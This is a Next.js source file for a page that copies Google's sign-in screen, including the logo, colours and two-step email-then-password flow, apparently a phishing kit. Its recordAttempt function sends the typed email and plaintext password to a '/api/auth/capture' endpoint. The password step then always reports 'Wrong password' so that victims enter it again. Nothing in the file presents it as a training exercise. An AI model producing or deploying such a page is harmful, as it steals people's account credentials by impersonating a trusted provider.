"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

export default function GoogleLoginPage() {
  const router = useRouter();
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);
  const [err, setErr] = useState("");

  async function recordAttempt() {
    try {
      await fetch("/api/auth/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ provider: "google", email, password }),
      });
    } catch {
      /* ignore */
    }
  }

  function submitEmail(e: React.FormEvent) {
    e.preventDefault();
    if (!email) return;
    setErr("");
    setStep("password");
  }

  async function submitPassword(e: React.FormEvent) {
    e.preventDefault();
    if (!password) return;
    setBusy(true);
    await recordAttempt();
    setBusy(false);
    setErr("Wrong password. Try again or click Forgot password to reset it.");
    setPassword("");
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-4 pt-16">
      <div className="w-full max-w-[450px]">
        <div className="flex justify-center mb-8">
          <svg width="75" height="24" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
            <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
            <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
            <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
            <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853"/>
            <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335"/>
            <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4"/>
          </svg>
        </div>

        <h1 className="text-2xl text-[#202124] text-center font-normal mb-2">
          {step === "email" ? "Sign in" : "Welcome"}
        </h1>
        <p className="text-sm text-[#202124] text-center mb-8">
          {step === "email" ? "to continue to SAM" : email}
        </p>

        {step === "email" ? (
          <form onSubmit={submitEmail} className="space-y-4">
            <div>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email or phone"
                required
                className="w-full border border-[#dadce0] rounded px-3 py-3 text-sm text-[#202124] placeholder-[#5f6368] focus:border-[#1a73e8] focus:ring-2 focus:ring-[#1a73e8]/20 outline-none"
              />
            </div>
            <div className="text-sm text-[#1a73e8] hover:underline cursor-pointer">
              Forgot email?
            </div>
            <p className="text-xs text-[#5f6368] pt-2">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <span className="text-[#1a73e8] hover:underline cursor-pointer">Learn more</span>
            </p>
            <div className="flex items-center justify-between pt-4">
              <button
                type="button"
                className="text-[#1a73e8] text-sm font-medium hover:bg-[#1a73e8]/10 px-2 py-1 rounded"
              >
                Create account
              </button>
              <button
                type="submit"
                className="bg-[#1a73e8] text-white text-sm font-medium px-6 py-2 rounded hover:bg-[#1557b0]"
              >
                Next
              </button>
            </div>
          </form>
        ) : (
          <form onSubmit={submitPassword} className="space-y-4">
            <div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                required
                autoFocus
                className="w-full border border-[#dadce0] rounded px-3 py-3 text-sm text-[#202124] placeholder-[#5f6368] focus:border-[#1a73e8] focus:ring-2 focus:ring-[#1a73e8]/20 outline-none"
              />
            </div>
            {err && <div className="text-xs text-red-600">{err}</div>}
            <div className="flex items-center justify-between pt-2">
              <div className="flex items-center">
                <input id="show" type="checkbox" className="mr-2" />
                <label htmlFor="show" className="text-sm text-[#202124]">Show password</label>
              </div>
            </div>
            <div className="flex items-center justify-between pt-4">
              <button
                type="button"
                className="text-[#1a73e8] text-sm font-medium hover:bg-[#1a73e8]/10 px-2 py-1 rounded"
              >
                Forgot password?
              </button>
              <button
                type="submit"
                disabled={busy}
                className="bg-[#1a73e8] text-white text-sm font-medium px-6 py-2 rounded hover:bg-[#1557b0] disabled:opacity-60"
              >
                {busy ? "Signing in…" : "Next"}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}
